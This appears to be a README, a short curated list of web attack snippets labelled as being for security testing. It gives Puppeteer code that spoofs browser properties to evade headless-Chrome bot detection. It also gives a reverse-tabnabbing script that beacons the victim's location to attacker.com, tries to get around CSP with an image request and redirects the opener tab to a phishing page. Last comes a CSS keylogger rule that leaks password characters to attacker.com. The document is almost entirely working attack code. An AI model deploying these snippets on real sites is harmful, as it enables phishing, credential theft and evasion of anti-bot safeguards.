# PEN
A (not-so-well)curated list of script and attack for security testing purposes and general knowledge.
  
## JavaScript:
  - #### Bypass `Chrome Headless` detection:
    ```javascript
    // Pass the User-Agent Test.
    const userAgent = 'Mozilla/5.0 (X11; Linux x86_64)' +
        'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.39 Safari/537.36';
    await page.setUserAgent(userAgent);
    
    await page.evaluateOnNewDocument(() => {
      // Pass the Webdriver Test.
      Object.defineProperty(navigator, 'webdriver', {
        get: () => false,
      });
      
      // Pass the Chrome Test.
      window.navigator.chrome = {
        // We can mock this in as much depth as we need for the test.
        runtime: {}, // etc.
      };
      
      // Pass the Plugins Length Test.
      Object.defineProperty(navigator, 'plugins', {
        // Overwrite the `plugins` property to use a custom getter.
        // This just needs to have `length > 0` for the current test,
        // but we could mock the plugins too if necessary.
        get: () => [1, 2, 3, 4, 5],
      });
      
      // Pass the Languages Test.
      Object.defineProperty(navigator, 'languages', {
        get: () => ['en-US', 'en'],
      });
      
      // Pass the Permissions Test.
      const originalQuery = window.navigator.permissions.query;
      return window.navigator.permissions.query = (parameters) => (
        parameters.name === 'notifications' ?
          Promise.resolve({ state: Notification.permission }) :
          originalQuery(parameters)
      );
    });    
    ```
    References:
    - https://intoli.com/blog/not-possible-to-block-chrome-headless/
    
  - #### `target="_blank"` vulnerability:
    ```javascript
    if (window.opener && window.opener.location) {
      // Imagine this script as a library added to an attacker official website.
      // If this site is opened by an user that clicked to an `a` element
      // with target attribute setted to '_blank', the browser will initialize an `opener` object,
      // referred to the browser window which the user came from.
      // This weakness could be used to redirect the opener window to a phishing site.

      let randomUserID = Math.random().toString().slice(2,),
        urlStartPhishing =
          `//attacker.com/new/phishing/?location=${window.opener.location}&user=${randomUserID}`,
        redirect2Phishing = () => {
          // Wait for the deployment of the phishing site.
          setTimeout(() => {
            window.opener.location.assign(`//attacker.com/${randomUserID}/${window.opener.location}`)
          }, 8000)
        };

      fetch(urlStartPhishing)
        .then(response => {
          redirect2Phishing()
        })
        .catch(err => {
          // Error, maybe CSP :(

          let bypassCSP = new Image();
          bypassCSP.src = urlStartPhishing;
          redirect2Phishing()
        });
    }
    ```  
    References:
    - https://dev.to/ben/the-targetblank-vulnerability-by-example
    - https://sites.google.com/site/bughunteruniversity/nonvuln/phishing-with-window-opener
  
## CSS:
  - #### CSS Keylogger: 
    ```css
    input[type="password"][value$="a"] {
      background-image: url("https://attacker.com/a");
    }
    ```  
    References:
    - https://github.com/maxchehab/CSS-Keylogging
    - https://hackaday.com/2018/02/25/css-steals-your-web-data/
